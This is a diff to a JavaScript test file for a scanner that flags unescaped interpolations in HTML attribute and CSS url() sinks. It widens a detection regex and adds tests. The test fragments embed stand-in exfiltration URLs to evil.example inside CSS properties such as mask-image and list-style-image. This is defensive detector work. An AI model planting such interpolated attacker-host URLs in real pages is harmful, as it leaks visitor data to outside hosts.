@@ -18,7 +18,7 @@ const stripComments = (src) => src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s
 // slider navigation line passed because `href="${prev}"` was listed). So one regex finds each URL-bearing
 // construct on its own, the `${…}` it opens is read to its closing brace, and THAT content is what is judged.
 //   attribute  : (src|href|srcset|data-src|xlink:href|action|formaction|poster|data-url) = ["']? <literal prefix> ${
-//   css        : url( ["']? ${        @import ["']? ${        background[-image]: … ${
+//   css        : url( ["']? <literal prefix> ${ (any property, round 7)        @import ["']? ${        background[-image]: … ${
 //   never allowed to appear at all : image-set(
 // 🔴 round 6 (review v5 #2): the attribute branch no longer stops at the first whitespace. ATTR_START finds
 // `src=` / `href=` / …; constructs() then reads the WHOLE value (quoted: to the closing quote, interpolations skipped over
@@ -28,7 +28,9 @@ const stripComments = (src) => src.replace(/\/\*[\s\S]*?\*\//g, '').replace(/^\s
 // youtube URL from an encoded id/channel/handle after the visitor clicks; it is renderer code, not an author-chosen destination.
 const ATTR_START = /(?<![\w.-])(?:src|href|srcset|data-src|xlink:href|action|formaction|poster|data-url)\s*=\s*/gi;
 const CONSTRUCT = new RegExp([
-  String.raw`(?<![\w.]|new )url\(\s*["']?\$\{`,
+  // 🔴 round 7 (review v6 #2): ANY `url(` that reaches a `${` — a literal prefix may sit between them, and the property is
+  // irrelevant (mask-image, cursor, list-style-image, …), in style="" values and <style> text alike.
+  String.raw`(?<![\w.]|new )url\(\s*["']?(?:(?!\$\{)[^)"'` + '`' + String.raw`])*\$\{`,
   String.raw`@import\s+["']?\$\{`,
   String.raw`background(?:-image)?\s*:[^;` + '`' + String.raw`]*?\$\{`,
 ].join('|'), 'gi');
@@ -168,4 +170,19 @@ test('sinks: r6#2 whitespace or a newline between the quote and `${` does not hi
 test('sinks: two constructs on one line are judged one by one', () => {
   const planted = SRC + '\nconst two = (ctx, x) => `<a href="${esc(attrUrl(ctx, x))}"><img src="${x}">`;\n';
   assert.deepEqual(unguardedSinks(planted), ['src="${x}']);
+});
+
+test('sinks: r7#3 any CSS property with url( + literal prefix + ${…} is reported, in style="" and in <style> text', () => {
+  for (const frag of [
+    '<i style="mask-image:url(https://evil.example/${x})">',
+    '<i style="-webkit-mask:url(\'https://evil.example/${x}\')">',
+    '<i style="cursor:url( /c/${x}.png ), auto">',
+    '<style>.a{list-style-image:url(https://evil.example/${x})}</style>',
+  ]) {
+    const planted = SRC + '\nconst leak = (x) => `' + frag + '`;\n';
+    assert.equal(unguardedSinks(planted).length - unguardedSinks(SRC).length, 1, `not reported exactly once: ${frag}`);
+  }
+  // a guarded value behind a literal prefix is still accepted; a url( with no interpolation is not a sink
+  const ok = SRC + '\nconst ok = (ctx, x) => `<i style="mask-image:url(${esc(cssAttrUrl(ctx, x))})"><i style="mask-image:url(/fixed.svg)">`;\n';
+  assert.deepEqual(unguardedSinks(ok), []);
 });
